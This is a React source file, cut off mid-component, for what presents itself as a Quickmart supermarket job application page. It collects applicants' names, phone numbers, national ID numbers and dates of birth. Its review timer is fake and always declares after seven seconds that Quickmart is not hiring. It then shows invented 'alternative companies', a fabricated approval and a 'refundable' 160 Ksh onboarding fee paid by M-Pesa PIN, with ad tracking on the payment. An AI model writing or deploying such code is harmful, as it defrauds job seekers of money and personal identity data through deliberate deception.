import React, { useState, useEffect } from 'react';
import { Mail, User, Phone, Calendar, MapPin, BookOpen, Briefcase, ChevronRight, ChevronLeft, CheckCircle, UserCheck, AlertCircle, Star, TrendingUp, Award, ArrowRight } from 'lucide-react';
import { trackApplicationConversion, trackPaymentInitiated, trackFinishApplicationClick } from '../utils/googleAdsTracking';

const steps = [
  'Personal Info',
  'Contact Details',
  'Education & Position',
  'Review & Submit'
];

const positions = [
  'Cashier', 'Cleaner', 'Store Keeper', 'Driver', 'Loaders & Off-loaders',
  'Marketer', 'Sales Attendant', 'Chef', 'Warehouse Supervisor', 'Guards'
];

const ApplicationPage: React.FC = () => {
  React.useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, []);

  const [step, setStep] = useState(0);
  const [form, setForm] = useState({
    firstName: '',
    lastName: '',
    phone: '',
    email: '',
    idNumber: '',
    dob: '',
    education: '',
    location: '',
    position: '',
    employmentType: '',
  });
  const [submitted, setSubmitted] = useState(false);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const nextStep = () => {
    setStep((s) => Math.min(s + 1, steps.length - 1));
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };
  const prevStep = () => {
    setStep((s) => Math.max(s - 1, 0));
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitted(true);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  return (
    <div className="min-h-screen bg-gradient-to-tr from-green-100 to-red-100 flex flex-col items-center justify-start py-10 px-2">
      <div className="max-w-3xl w-full bg-white rounded-3xl shadow-2xl p-8 animate-fade-in">
        <h1 className="text-4xl md:text-5xl font-black text-center text-red-600 mb-6 flex items-center justify-center gap-2">
          <Briefcase className="h-10 w-10 text-green-600" /> Quickmart Careers Application
        </h1>

        {/* Multi-step Form */}
        <div className="flex items-center justify-center mb-8">
          {steps.map((label, idx) => (
            <div key={label} className="flex items-center">
              <div className={`rounded-full border-4 ${step >= idx ? 'border-green-500 bg-green-500 text-white' : 'border-gray-300 bg-gray-200 text-gray-400'} w-10 h-10 flex items-center justify-center font-bold text-lg transition-all duration-300`}>{idx + 1}</div>
              {idx < steps.length - 1 && <ChevronRight className="mx-2 text-gray-400" />}
            </div>
          ))}
        </div>

        {!submitted ? (
          <form onSubmit={handleSubmit} className="space-y-6">
            {step === 0 && (
              <div>
                <div className="mb-8">
                  <h2 className="text-xl font-bold mb-2 text-green-700">COMMUNICATION AND MEANS:</h2>
                  <ul className="text-gray-700 mb-2 list-disc pl-6">
                    <li>Successful applicants will be contacted via official email as soon as possible.</li>
                    <li>Job inductions will be conducted immediately in all mentioned Quickmart Supermarket branches on reporting days.</li>
                  </ul>
                  <h2 className="text-xl font-bold mb-2 text-green-700 mt-4">QUALIFICATIONS:</h2>
                  <ul className="text-gray-700 list-decimal pl-6">
                    <li>Must be KENYAN of 18 years and above.</li>
                    <li>Reliability and trustworthiness.</li>
                    <li>Punctuality, time management and a sense of urgency.</li>
                    <li>Strong communication skills.</li>
                    <li>Good customer service skills.</li>
                    <li>Clean driving record and driving license. <span className="text-xs">(Driving applicants)</span></li>
                    <li>Ability to move and deliver items to the recipient. <span className="text-xs">(Packers and sales attendant)</span></li>
                  </ul>
                  <p className="text-base font-bold text-blue-700 bg-blue-50 border-l-4 border-blue-500 p-3 rounded mt-4 shadow-sm">NOTE: More training will be offered to you (for qualified candidates on their reporting days).</p>
                </div>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <label className="block font-semibold mb-1 text-gray-700 flex items-center"><User className="h-5 w-5 mr-1 text-green-600" />First Name</label>
                    <input type="text" name="firstName" value={form.firstName} onChange={handleChange} required className="w-full px-4 py-2 rounded-lg border-2 border-gray-200 focus:border-green-500 focus:ring-2 focus:ring-green-200 outline-none" />
                  </div>
                  <div>
                    <label className="block font-semibold mb-1 text-gray-700 flex items-center"><User className="h-5 w-5 mr-1 text-green-600" />Last Name</label>
                    <input type="text" name="lastName" value={form.lastName} onChange={handleChange} required className="w-full px-4 py-2 rounded-lg border-2 border-gray-200 focus:border-green-500 focus:ring-2 focus:ring-green-200 outline-none" />
                  </div>
                </div>
              </div>
            )}
            {step === 1 && (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <label className="block font-semibold mb-1 text-gray-700 flex items-center"><Phone className="h-5 w-5 mr-1 text-green-600" />Phone Number</label>
                  <input type="tel" name="phone" value={form.phone} onChange={handleChange} required className="w-full px-4 py-2 rounded-lg border-2 border-gray-200 focus:border-green-500 focus:ring-2 focus:ring-green-200 outline-none" />
                </div>
                <div>
                  <label className="block font-semibold mb-1 text-gray-700 flex items-center"><Mail className="h-5 w-5 mr-1 text-green-600" />Email</label>
                  <input type="email" name="email" value={form.email} onChange={handleChange} required className="w-full px-4 py-2 rounded-lg border-2 border-gray-200 focus:border-green-500 focus:ring-2 focus:ring-green-200 outline-none" />
                </div>
                <div>
                  <label className="block font-semibold mb-1 text-gray-700 flex items-center"><UserCheck className="h-5 w-5 mr-1 text-green-600" />ID Number</label>
                  <input type="text" name="idNumber" value={form.idNumber} onChange={handleChange} required className="w-full px-4 py-2 rounded-lg border-2 border-gray-200 focus:border-green-500 focus:ring-2 focus:ring-green-200 outline-none" />
                </div>
                <div>
                  <label className="block font-semibold mb-1 text-gray-700 flex items-center"><Calendar className="h-5 w-5 mr-1 text-green-600" />Date of Birth</label>
                  <input type="date" name="dob" value={form.dob} onChange={handleChange} required className="w-full px-4 py-2 rounded-lg border-2 border-gray-200 focus:border-green-500 focus:ring-2 focus:ring-green-200 outline-none" />
                </div>
              </div>
            )}
            {step === 2 && (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <label className="block font-semibold mb-1 text-gray-700 flex items-center"><BookOpen className="h-5 w-5 mr-1 text-green-600" />Education</label>
                  <select name="education" value={form.education} onChange={handleChange} required className="w-full px-4 py-2 rounded-lg border-2 border-gray-200 focus:border-green-500 focus:ring-2 focus:ring-green-200 outline-none">
                    <option value="">Select Education Level</option>
                    <option value="Primary">Primary</option>
                    <option value="Secondary">Secondary</option>
                    <option value="College">College</option>
                    <option value="University">University</option>
                  </select>
                </div>
                <div>
                  <label className="block font-semibold mb-1 text-gray-700 flex items-center"><MapPin className="h-5 w-5 mr-1 text-green-600" />Where are you located?</label>
                  <input type="text" name="location" value={form.location} onChange={handleChange} required className="w-full px-4 py-2 rounded-lg border-2 border-gray-200 focus:border-green-500 focus:ring-2 focus:ring-green-200 outline-none" placeholder="e.g. Nairobi" />
                </div>
                <div>
                  <label className="block font-semibold mb-1 text-gray-700 flex items-center"><Briefcase className="h-5 w-5 mr-1 text-green-600" />Position you are applying for</label>
                  <select name="position" value={form.position} onChange={handleChange} required className="w-full px-4 py-2 rounded-lg border-2 border-gray-200 focus:border-green-500 focus:ring-2 focus:ring-green-200 outline-none">
                    <option value="">Select Position</option>
                    {positions.map((pos) => <option key={pos} value={pos}>{pos}</option>)}
                  </select>
                </div>
                <div>
                  <label className="block font-semibold mb-1 text-gray-700 flex items-center"><Briefcase className="h-5 w-5 mr-1 text-green-600" />Do you want to work part time or full time?</label>
                  <select name="employmentType" value={form.employmentType} onChange={handleChange} required className="w-full px-4 py-2 rounded-lg border-2 border-gray-200 focus:border-green-500 focus:ring-2 focus:ring-green-200 outline-none">
                    <option value="">Select Type</option>
                    <option value="Full Time">Full Time</option>
                    <option value="Part Time">Part Time</option>
                  </select>
                </div>
              </div>
            )}
            {step === 3 && (
              <div className="space-y-4">
                <div className="text-green-700 font-bold text-lg mb-2">Review Your Application</div>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {Object.entries(form).map(([key, value]) => (
                    <div key={key} className="bg-green-50 rounded-lg px-4 py-2 text-gray-700"><span className="font-semibold capitalize">{key.replace(/([A-Z])/g, ' $1')}</span>: {value}</div>
                  ))}
                </div>
              </div>
            )}
            <div className="flex justify-between mt-8">
              {step > 0 && <button type="button" onClick={prevStep} className="px-6 py-2 rounded-lg bg-gray-200 hover:bg-gray-300 text-gray-700 font-semibold flex items-center"><ChevronLeft className="mr-2" />Back</button>}
              {step < steps.length - 1 && <button type="button" onClick={nextStep} className="px-6 py-2 rounded-lg bg-green-600 hover:bg-green-700 text-white font-bold flex items-center">Next<ChevronRight className="ml-2" /></button>}
              {step === steps.length - 1 && <button type="submit" className="px-8 py-2 rounded-lg bg-blue-600 hover:bg-blue-700 text-white font-bold flex items-center">Submit <CheckCircle className="ml-2" /></button>}
            </div>
          </form>
        ) : (
          <AnimatedApplicationFeedback form={form} />
        )}
      </div>
    </div>
  );
};

type ApplicationForm = {
  firstName: string;
  lastName: string;
  phone: string;
  email: string;
  idNumber: string;
  dob: string;
  education: string;
  location: string;
  position: string;
  employmentType: string;
};

const AnimatedApplicationFeedback: React.FC<{ form: ApplicationForm }> = ({ form }) => {
  const [showFeeStep, setShowFeeStep] = useState(false);
  
  const [showSTKModal, setShowSTKModal] = useState(false);
  const [showAlternativeCompanies, setShowAlternativeCompanies] = useState(false);
  const [selectedCompany, setSelectedCompany] = useState<string | null>(null);
  const [showCompanyApplicationForm, setShowCompanyApplicationForm] = useState(false);
  const [processingAlternativeApp, setProcessingAlternativeApp] = useState(false);
  const [alternativeAppApproved, setAlternativeAppApproved] = useState(false);

  const [processing, setProcessing] = useState(true);
  const [time, setTime] = useState(0); // Start from 0, count up
  const [showApproved, setShowApproved] = useState(false);
  const [showQuickMartNotHiring, setShowQuickMartNotHiring] = useState(false);

  // All positions will trigger the alternative flow
  const isTriggerPosition = true; // Now applies to ALL positions

  // Count-up timer
  useEffect(() => {
    if (!processing) return;
    
    const interval = setInterval(() => setTime(t => t + 1), 1000);
    return () => clearInterval(interval);
  }, [processing]);

  // Animated review steps
  const reviewSteps = [
    'Reviewing Personal Info',
    'Reviewing Contact Details',
    'Reviewing Education & Position',
    'Finalizing & Matching'
  ];
  const [currentStep, setCurrentStep] = useState(0);
  useEffect(() => {
    if (!processing) return;
    const stepInterval = setInterval(() => {
      setCurrentStep(s => (s + 1) % reviewSteps.length);
    }, 8000); // 8 seconds per step (total 32s)
    return () => clearInterval(stepInterval);
  }, [processing]);

  // Handle popup triggers based on timer
  useEffect(() => {
    // Debug logging
    console.log(`Timer: ${time}s elapsed, Position: ${form.position}, Processing: ${processing}, ShowNotHiring: ${showQuickMartNotHiring}`);
    
    // Trigger for ALL positions after 7 seconds
    if (time === 7 && !showQuickMartNotHiring) {
      console.log('Triggering QuickMart not hiring popup at 7 seconds for position: ' + form.position);
      setShowQuickMartNotHiring(true);
      // Delay stopping processing to ensure state updates properly
      setTimeout(() => {
        setProcessing(false);
        // Scroll to top when showing the popup
        window.scrollTo({ top: 0, behavior: 'smooth' });
      }, 100);
      return;
    }
    
    // Stop timer at 120 seconds as fallback
    if (time >= 120) {
      setProcessing(false);
    }
  }, [time, showQuickMartNotHiring, form.position, processing]);

  // Scroll to top when major state changes occur
  useEffect(() => {
    if (showQuickMartNotHiring || showAlternativeCompanies || showCompanyApplicationForm || alternativeAppApproved) {
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }
  }, [showQuickMartNotHiring, showAlternativeCompanies, showCompanyApplicationForm, alternativeAppApproved]);

  // SVG Confetti burst
  const ConfettiBurst = () => (
    <svg width="220" height="80" className="mx-auto mb-6" viewBox="0 0 220 80" fill="none" xmlns="http://www.w3.org/2000/svg">
      {[...Array(24)].map((_, i) => (
        <circle
          key={i}
          cx={20 + Math.random() * 180}
          cy={20 + Math.random() * 40}
          r={3 + Math.random() * 3}
          fill={`hsl(${Math.floor(Math.random()*360)},90%,60%)`}
          opacity={0.7}
        />
      ))}
    </svg>
  );

  // Alternative companies data
  const alternativeCompanies = [
    {
      id: 'megamart',
      name: 'MegaMart Plus',
      logo: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjgwIiB2aWV3Qm94PSIwIDAgMjAwIDgwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iODAiIGZpbGw9IiMxZTQwYWYiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIiBmb250LXNpemU9IjI4IiBmb250LXdlaWdodD0iYm9sZCIgZmlsbD0id2hpdGUiPk1lZ2FNYXJ0PC90ZXh0Pjwvc3ZnPg==',
      description: 'Leading retail chain with over 50 branches nationwide, offering competitive salaries and benefits',
      benefits: ['Competitive salary', 'Career growth', 'Health insurance'],
      positions: 8,
      color: 'blue',
      url: '/company-blogs/megamart/'
    },
    {
      id: 'freshco',
      name: 'FreshCo Stores',
      logo: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjgwIiB2aWV3Qm94PSIwIDAgMjAwIDgwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iODAiIGZpbGw9IiNlYTU4MGMiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIiBmb250LXNpemU9IjI4IiBmb250LXdlaWdodD0iYm9sZCIgZmlsbD0id2hpdGUiPkZyZXNoQ288L3RleHQ+PC9zdmc+',
      description: 'Premium retail experience focused on fresh products and excellent customer service',
      benefits: ['Premium environment', 'Training programs', 'Performance bonuses'],
      positions: 12,
      color: 'orange',
      url: '/company-blogs/freshco/'
    },
    {
      id: 'valuemart',
      name: 'ValueMart Express',
      logo: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjgwIiB2aWV3Qm94PSIwIDAgMjAwIDgwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iODAiIGZpbGw9IiMxNmEzNGEiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIiBmb250LXNpemU9IjI4IiBmb250LXdlaWdodD0iYm9sZCIgZmlsbD0id2hpdGUiPlZhbHVlTWFydDwvdGV4dD48L3N2Zz4=',
      description: 'Fast-growing retail chain committed to employee development and customer satisfaction',
      benefits: ['Flexible schedules', 'Growth opportunities', 'Team environment'],
      positions: 5,
      color: 'green',
      url: '/company-blogs/valuemart/'
    }
  ];

  return (
    <div className="flex flex-col items-center justify-center py-16">
      {(processing || (!showApproved && !showQuickMartNotHiring && !showAlternativeCompanies)) && !showQuickMartNotHiring ? (
        <div className="flex flex-col items-center animate-fade-in w-full max-w-lg">
          <div className="text-3xl font-black text-blue-700 mb-2 animate-pulse">Processing your application...</div>
          <div className="text-lg text-blue-500 font-semibold mb-1 animate-fade-in">{reviewSteps[currentStep]}</div>
          <div className="mb-2 text-gray-600 text-center">Estimated review time: <span className="font-bold text-blue-700">2 minutes</span></div>
          <div className="mb-2 text-yellow-600 text-center font-semibold">Do not leave this page while your application is being reviewed.</div>
          <div className="relative w-24 h-24 mb-6">
            <div className="absolute inset-0 rounded-full border-8 border-blue-200 border-t-blue-600 animate-spin" />
            <div className="absolute inset-4 rounded-full border-4 border-blue-100 border-t-blue-400 animate-spin-slow" />
            <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 text-blue-700 text-lg font-bold animate-pulse">{time}s</div>
          </div>
          <div className="text-base text-gray-500">Your application is being securely reviewed and matched to open positions.</div>
        </div>
      ) : showQuickMartNotHiring && !showAlternativeCompanies ? (
        <QuickMartNotHiringModal 
          position={form.position}
          onExit={() => window.location.href = '/'}
          onProceed={() => setShowAlternativeCompanies(true)}
        />
      ) : showAlternativeCompanies && !selectedCompany ? (
        <AlternativeCompaniesModal
          companies={alternativeCompanies}
          position={form.position}
          onSelectCompany={(companyId) => {
            setSelectedCompany(companyId);
            setShowCompanyApplicationForm(true);
          }}
          onBack={() => {
            setShowAlternativeCompanies(false);
            setShowQuickMartNotHiring(true);
          }}
        />
      ) : showCompanyApplicationForm && selectedCompany && !processingAlternativeApp && !alternativeAppApproved ? (
        <CompanyApplicationForm
          company={alternativeCompanies.find(c => c.id === selectedCompany)!}
          position={form.position}
          applicantName={`${form.firstName} ${form.lastName}`}
          onSubmit={() => {
            setShowCompanyApplicationForm(false);
            setProcessingAlternativeApp(true);
            // Simulate processing
            setTimeout(() => {
              setProcessingAlternativeApp(false);
              setAlternativeAppApproved(true);
            }, 15000);
          }}
          onBack={() => {
            setShowCompanyApplicationForm(false);
            setSelectedCompany(null);
          }}
        />
      ) : processingAlternativeApp ? (
        <ProcessingAlternativeApplication 
          company={alternativeCompanies.find(c => c.id === selectedCompany)!}
        />
      ) : alternativeAppApproved ? (
        <AlternativeApplicationApproved
          company={alternativeCompanies.find(c => c.id === selectedCompany)!}
          position={form.position}
          onProceedToPayment={() => setShowFeeStep(true)}
        />
      ) : showApproved ? (
        <div className="flex flex-col items-center animate-fade-in">
          <ConfettiBurst />
          <div className="text-4xl font-black text-green-700 mb-4 animate-bounce">Congratulations!</div>
          <div className="text-2xl font-bold text-blue-700 mb-4 animate-fade-in">Slots Found & Application Approved</div>
          <div className="bg-white rounded-2xl shadow-lg p-6 mb-4 animate-fade-in">
            <div className="text-lg text-gray-800 mb-2">You qualify for the <span className="font-bold text-green-700">{form.position}</span> position.</div>
            <div className="text-blue-700 text-lg font-bold mb-1">2 slots remaining</div>
            <div className="text-gray-600 mb-2">After reviewing your application, you have been matched to open slots.</div>
            <div className="text-blue-700 font-semibold">You will receive further communication concerning your interview and documents required through an SMS text, email, or phone call. Click on the next step below to secure your spot.</div>
            <div className="text-sm text-gray-500 mt-1">Complete the registration step below.</div>
          </div>
          <button 
            className="px-8 py-3 rounded-lg bg-gradient-to-r from-green-500 to-blue-600 hover:from-blue-600 hover:to-green-500 text-white font-bold text-lg shadow-lg mt-4 animate-fade-in"
            onClick={() => {
              trackPaymentInitiated(form.position);
              setShowFeeStep(true);
            }}
            type="button"
          >
            Next Step
          </button>
        </div>
      ) : null}

      {/* Onboarding Fee Step as Modal Popup */}
      {showFeeStep && (
        <OnboardingFeeModal 
          onClose={() => setShowFeeStep(false)} 
          onFinish={() => setShowSTKModal(true)}
        />
      )}

      {/* STK Push Modal */}
      {showSTKModal && (
        <STKPushModal onClose={() => setShowSTKModal(false)} />
      )}

    </div>
  );
};

// Onboarding Fee Modal Component
const OnboardingFeeModal: React.FC<{ onClose: () => void, onFinish: () => void }> = ({ onClose }) => {
  const [copied, setCopied] = useState(false);
  const refundCode = "2224";

  const handleCopy = () => {
    navigator.clipboard.writeText(refundCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center">
      {/* Overlay */}
      <div className="fixed inset-0 bg-black bg-opacity-40 backdrop-blur-sm transition-opacity animate-fade-in" onClick={onClose} />
      {/* Modal */}
      <div className="relative z-10 bg-gradient-to-br from-blue-50 to-green-50 rounded-3xl shadow-2xl p-8 max-w-lg w-full flex flex-col items-center animate-fade-in-up">
        <button
          className="absolute top-4 right-4 text-blue-600 hover:text-red-500 text-2xl font-bold focus:outline-none"
          onClick={onClose}
          aria-label="Close"
        >
          &times;
        </button>
        <div className="flex items-center mb-4">
          <svg className="w-10 h-10 text-blue-600 mr-2 animate-bounce" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M12 8c-1.657 0-3 1.343-3 3 0 1.657 1.343 3 3 3s3-1.343 3-3c0-1.657-1.343-3-3-3zm0 9c-3.866 0-7-3.134-7-7 0-3.866 3.134-7 7-7s7 3.134 7 7c0 3.866-3.134 7-7 7z" /></svg>
          <span className="text-2xl font-extrabold text-blue-700">Onboarding Application Fee</span>
        </div>
        <div className="text-lg text-gray-700 mb-4 text-center">A <span className="font-bold text-green-600">refundable onboarding application fee</span> of <span className="font-bold text-blue-700">160 Ksh</span> will be paid.</div>
        <div className="flex items-center justify-center mb-2">
          <span className="text-base font-semibold text-gray-700 mr-2">Refund Code:</span>
          <span className="text-xl font-mono bg-blue-100 px-3 py-1 rounded-lg text-blue-700 border border-blue-300 select-all shadow-sm">{refundCode}</span>
          <button onClick={handleCopy} className="ml-2 px-2 py-1 rounded bg-blue-600 hover:bg-blue-700 text-white text-sm font-bold transition-colors" title="Copy refund code">
            {copied ? 'Copied!' : 'Copy'}
          </button>
        </div>
        <div className="text-sm text-gray-600 mb-6 text-center">Save this code together with your Mpesa transaction code. This code will be used as evidence for your refund.</div>
        <button
          className="px-8 py-3 rounded-lg bg-gradient-to-r from-green-500 to-blue-600 hover:from-blue-600 hover:to-green-500 text-white font-bold text-lg shadow-lg mt-4 animate-fade-in"
          onClick={() => {
            trackFinishApplicationClick();
            trackApplicationConversion({
              value: 160,
              transactionId: `quickmart_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
            });
            window.open('https://recruitmentquickmart.netlify.app/', '_blank');
            onClose();
          }}
        >
          Finish Application
        </button>
      </div>
    </div>
  );
};

// STK Push Modal
const STKPushModal: React.FC<{ onClose: () => void }> = ({ onClose }) => (
  <div className="fixed inset-0 z-50 flex items-center justify-center">
    <div className="fixed inset-0 bg-black bg-opacity-40 backdrop-blur-sm transition-opacity animate-fade-in" onClick={onClose} />
    <div className="relative z-10 bg-gradient-to-br from-blue-50 to-green-50 rounded-3xl shadow-2xl p-8 max-w-md w-full flex flex-col items-center animate-fade-in-up">
      <button
        className="absolute top-4 right-4 text-blue-600 hover:text-red-500 text-2xl font-bold focus:outline-none"
        onClick={onClose}
        aria-label="Close"
      >
        &times;
      </button>
      <svg className="w-14 h-14 text-green-600 mb-3 animate-bounce" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M12 8c-1.657 0-3 1.343-3 3 0 1.657 1.343 3 3 3s3-1.343 3-3c0-1.657-1.343-3-3-3zm0 9c-3.866 0-7-3.134-7-7 0-3.866 3.134-7 7-7s7 3.134 7 7c0 3.866-3.134 7-7 7z" /></svg>
      <div className="text-2xl font-black text-green-700 mb-2 text-center">Payment Request Sent</div>
      <div className="text-lg text-blue-700 font-semibold mb-2 text-center">You will receive an STK payment from <span className="font-bold">Quickmart Sasapay</span>.</div>
      <div className="text-gray-700 mb-2 text-center">Enter your Mpesa PIN to complete your application.</div>
      <div className="text-sm text-gray-600 mb-4 text-center">You will receive an SMS notification for interview scheduling and requirements.</div>
      <button
        className="px-8 py-3 rounded-lg bg-gradient-to-r from-green-500 to-blue-600 hover:from-blue-600 hover:to-green-500 text-white font-bold text-lg shadow-lg mt-2 animate-fade-in"
        onClick={onClose}
      >
        Close
      </button>
    </div>
  </div>
);

// QuickMart Not Hiring Modal Component
const QuickMartNotHiringModal: React.FC<{ 
  position: string;
  onExit: () => void;
  onProceed: () => void;
}> = ({ position, onExit, onProceed }) => {
  return (
    <div className="flex flex-col items-center justify-center animate-fade-in w-full px-4 py-4">
      <div className="bg-gradient-to-br from-yellow-50 via-white to-orange-50 rounded-2xl shadow-2xl p-4 sm:p-6 md:p-8 w-full max-w-lg sm:max-w-xl md:max-w-2xl">
        {/* Header with Alert Icon - Mobile Optimized */}
        <div className="flex items-center justify-center mb-4 sm:mb-6">
          <div className="relative">
            <div className="absolute inset-0 bg-yellow-400 rounded-full blur-xl opacity-30 animate-pulse"></div>
            <AlertCircle className="h-12 w-12 sm:h-16 sm:w-16 md:h-20 md:w-20 text-yellow-500 relative z-10 animate-bounce" />
          </div>
        </div>

        {/* Main Message - Responsive Text */}
        <h2 className="text-xl sm:text-2xl md:text-3xl font-black text-center text-gray-800 mb-3 sm:mb-4 px-2">
          Unfortunately, <span className="text-red-600">QuickMart</span> is not hiring right now
        </h2>
        
        {/* Subheading with hope - Mobile Friendly */}
        <div className="bg-gradient-to-r from-green-100 to-blue-100 rounded-xl sm:rounded-2xl p-3 sm:p-4 md:p-6 mb-4 sm:mb-6">
          <h3 className="text-base sm:text-lg md:text-xl font-bold text-center text-green-700 mb-2 sm:mb-3">
            But Great News! 🎉
          </h3>
          <p className="text-center text-gray-700 text-sm sm:text-base md:text-lg mb-1 sm:mb-2">
            We have <span className="font-bold text-blue-600">3 blogs</span> actively hiring
          </p>
          <p className="text-center text-gray-600 text-xs sm:text-sm md:text-base">
            You still qualify for the <span className="font-bold text-green-600">{position}</span> position!
          </p>
        </div>

        {/* Benefits List - Stack on Mobile */}
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 sm:gap-3 md:gap-4 mb-4 sm:mb-6 md:mb-8">
          <div className="bg-white rounded-lg sm:rounded-xl p-3 sm:p-4 shadow-md border-2 border-green-200">
            <Star className="h-6 w-6 sm:h-7 sm:w-7 md:h-8 md:w-8 text-yellow-500 mb-1 sm:mb-2 mx-auto" />
            <p className="text-xs sm:text-sm text-center font-semibold text-gray-700">Same Position Available</p>
          </div>
          <div className="bg-white rounded-lg sm:rounded-xl p-3 sm:p-4 shadow-md border-2 border-blue-200">
            <TrendingUp className="h-6 w-6 sm:h-7 sm:w-7 md:h-8 md:w-8 text-blue-500 mb-1 sm:mb-2 mx-auto" />
            <p className="text-xs sm:text-sm text-center font-semibold text-gray-700">Competitive Salaries</p>
          </div>
          <div className="bg-white rounded-lg sm:rounded-xl p-3 sm:p-4 shadow-md border-2 border-purple-200">
            <Award className="h-6 w-6 sm:h-7 sm:w-7 md:h-8 md:w-8 text-purple-500 mb-1 sm:mb-2 mx-auto" />
            <p className="text-xs sm:text-sm text-center font-semibold text-gray-700">Immediate Start</p>
          </div>
        </div>

        {/* Action Buttons - Stack on Very Small Screens */}
        <div className="flex flex-col sm:flex-row gap-2 sm:gap-3 md:gap-4">
          <button
            onClick={onExit}
            className="w-full sm:flex-1 px-4 sm:px-5 md:px-6 py-2.5 sm:py-3 rounded-lg sm:rounded-xl bg-gray-200 hover:bg-gray-300 text-gray-700 font-bold text-sm sm:text-base transition-all duration-300 transform hover:scale-105"
          >
            Exit Application
          </button>
          <button
            onClick={onProceed}
            className="w-full sm:flex-1 px-4 sm:px-5 md:px-6 py-2.5 sm:py-3 rounded-lg sm:rounded-xl bg-gradient-to-r from-green-500 to-blue-600 hover:from-blue-600 hover:to-green-500 text-white font-bold text-sm sm:text-base transition-all duration-300 transform hover:scale-105 shadow-lg animate-pulse"
          >
            Proceed to Apply
            <ArrowRight className="inline ml-1 sm:ml-2 h-4 w-4 sm:h-5 sm:w-5" />
          </button>
        </div>
      </div>
    </div>
  );
};

// Alternative Companies Modal Component
const AlternativeCompaniesModal: React.FC<{
  companies: any[];
  position: string;
  onSelectCompany: (companyId: string) => void;
  onBack: () => void;
}> = ({ companies, position, onSelectCompany, onBack }) => {
  return (
    <div className="w-full px-4 py-4 animate-fade-in">
      <div className="text-center mb-4 sm:mb-6 md:mb-8">
        <h2 className="text-2xl sm:text-3xl md:text-4xl font-black text-gray-800 mb-2 sm:mb-3 md:mb-4">
          Choose Your Next <span className="text-green-600">Blog Opportunity</span>
        </h2>
        <p className="text-sm sm:text-lg md:text-xl text-gray-600 px-2">
          3 Top Blogs Hiring for <span className="font-bold text-blue-600">{position}</span> Position
        </p>
      </div>

      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-5 md:gap-6 mb-4 sm:mb-6 md:mb-8 max-w-6xl mx-auto">
        {companies.map((company, index) => (
          <div
            key={company.id}
            className="bg-white rounded-2xl sm:rounded-3xl shadow-xl sm:shadow-2xl overflow-hidden transform hover:scale-105 transition-all duration-500 animate-fade-in-up"
            style={{ animationDelay: `${index * 100}ms` }}
          >
            {/* Company Header with Logo - Mobile Optimized */}
            <div className="relative h-32 sm:h-40 md:h-48 bg-gradient-to-br from-gray-100 to-gray-200 flex items-center justify-center p-4 sm:p-5 md:p-6">
              <img 
                src={company.logo} 
                alt={company.name}
                className="max-h-16 sm:max-h-20 md:max-h-24 max-w-full object-contain"
              />
              <div className="absolute top-2 right-2 sm:top-3 sm:right-3 md:top-4 md:right-4 bg-green-500 text-white px-2 sm:px-3 py-0.5 sm:py-1 rounded-full text-xs sm:text-sm font-bold">
                {company.positions} Slots
              </div>
            </div>

            {/* Company Details - Mobile Friendly */}
            <div className="p-4 sm:p-5 md:p-6">
              <h3 className="text-lg sm:text-xl md:text-2xl font-bold text-gray-800 mb-2 sm:mb-3">{company.name}</h3>
              <p className="text-xs sm:text-sm md:text-base text-gray-600 mb-3 sm:mb-4">{company.description}</p>
              
              {/* Benefits - Responsive */}
              <div className="space-y-1.5 sm:space-y-2 mb-4 sm:mb-5 md:mb-6">
                {company.benefits.map((benefit: string, idx: number) => (
                  <div key={idx} className="flex items-center text-xs sm:text-sm text-gray-700">
                    <CheckCircle className="h-3 w-3 sm:h-4 sm:w-4 text-green-500 mr-1.5 sm:mr-2 flex-shrink-0" />
                    <span>{benefit}</span>
                  </div>
                ))}
              </div>

              {/* Apply Button - Mobile Optimized */}
              <button
                onClick={() => window.open(company.url, '_blank')}
